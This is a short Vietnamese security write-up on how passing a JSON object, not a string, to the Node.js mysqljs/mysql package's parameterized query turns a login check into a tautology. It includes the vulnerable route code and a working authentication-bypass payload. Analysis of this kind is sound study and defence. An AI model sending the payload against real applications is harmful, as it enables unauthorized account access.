# SQLi thông qua bypass hàm escape trong package mysqljs/mysql của nodejs
Thông thuờng, query escape functions hay bind param thuờng đưọc sử dụng để tránh lỗ hổng SQLi. Nhưng đối với MySQL package ``mysqljs/mysql`` trong Nodejs, ta sẽ có những phuơng thức escape khác nhau đối với các loại giá trị khác nhau => Nó có thể gây ra các hành vi không mong muốn khi kẻ tấn công truyền 1 tham số với loại giá trị khác. Ví dụ trong truờng hợp sau:


``/api/login`` lấy tên người dùng & mật khẩu từ đầu vào của người dùng.
```
router.post('/api/login', async (req, res) => {
	const { username, password } = req.body;

	if (username && password) {
		return db.loginUser(username, password)
[...]
 module.exports = database => {
	db = database;
	return router;
};
```

Nó đưọc pass đến hàm ``loginUser()`` và sau đó pass vào câu truy vấn prepare statement:
```
async loginUser(user, pass) {
    return new Promise(async (resolve, reject) => {
        let stmt = 'SELECT username FROM users WHERE username = ? AND password = ?';
        this.connection.query(stmt, [user, pass], (err, result) => {
```

Và vì mình điều khiển đưọc type của input đầu vào, ta có thể truyền vào với payload như sau:
```
{"username":"admin","password": {"password": 1}}
```

root cause: [here](https://github.com/mysqljs/mysql/blob/master/Readme.md#escaping-query-values)

>Objects are turned into `key = 'val'` pairs for each enumerable property on the object. If the property's value is a function, it is skipped; if the property's value is an object, toString() is called on it and the returned value is used.

Cụ thể hơn, thì giờ prepared statement sẽ có dạng như sau:
```
SELECT username FROM users WHERE username = 'admin' AND password = `password` = 1
```

``password = \`password\` => True(1) = 1 => True => bypass``

